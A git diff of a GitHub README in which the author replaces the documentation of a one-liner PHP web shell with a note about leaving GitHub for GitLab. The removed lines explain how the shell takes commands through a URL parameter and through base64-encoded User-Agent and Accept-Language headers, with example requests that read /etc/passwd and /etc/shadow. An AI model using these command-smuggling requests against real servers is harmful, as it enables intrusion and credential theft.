@@ -1,35 +1,32 @@
-# OLPWS
-One Liner PHP Web Shell
+# Bye bye Github...
 
+Why do I'm leaving Github ?
 
-## For testing
-You can use the internal web server of PHP like this:
+> Because I can't live with the idea that Microsoft now owns the biggest place where the open source code is / was hosted.
 
-```bash
-php -S localhost:[port] shell.php
-```
+And ?
 
-## Features
-It reads commands from:
-* Using GET method: `$_GET['e']`
-* Using HTTP User-Agent: define the user-agent header with a base64_encoded payload
-* Using HTTP Accept-Language: define the accept-language header with a base64_encoded payload
+> Also because Github didn't took the time to ask us, developpers, users, if we would be ok with this operation and my reply would be **NO!**
 
-It automaticaly detects and decode base64_encoded payloads.
+# New home
 
+But where could you find my code now ?
 
-## Examples
-Somes examples:
-* http://host:port/?e=cat%20/etc/passwd
-* http://host:port/?e=Y2F0IC9ldGMvcGFzc3dk (the same but base64_encoded)
-* Using cURL: `curl http://host:port -A Y2F0IC9ldGMvcGFzc3dk`
-* http://host:port/?e=echo%20password%20|%20sudo%20-S%20cat%20/etc/shadow
-* http://host:port/?e=ZWNobyBwYXNzd29yZCB8IHN1ZG8gLVMgY2F0IC9ldGMvc2hhZG93 (the same but base64_encoded)
-* Using cURL: `curl http://host:port -A ZWNobyBwYXNzd29yZCB8IHN1ZG8gLVMgY2F0IC9ldGMvc2hhZG93`
+> I just moved to Gitlab as many other devs did.
 
+# Gists
 
-## Credits
-Ideas comes from:
-* http://www.grobinson.me/single-line-php-script-to-gain-shell/
-* https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/
-* https://stackoverflow.com/questions/2556345/detect-base64-encoding-in-php/47486214#47486214
+My gists will stay on Github for few reasons:
+
+ * Github has a better audience on Google
+ * Did not found the same feature with the same visibility on Gitlab
+
+Place of my gists: https://gist.github.com/jiab77
+
+# Projects
+
+I might just keep the projects names on Github too for the same reason as above, but with only the present file and a link to the new project home.
+
+# Repository
+
+The new place is here: https://gitlab.com/jiab77/olpws
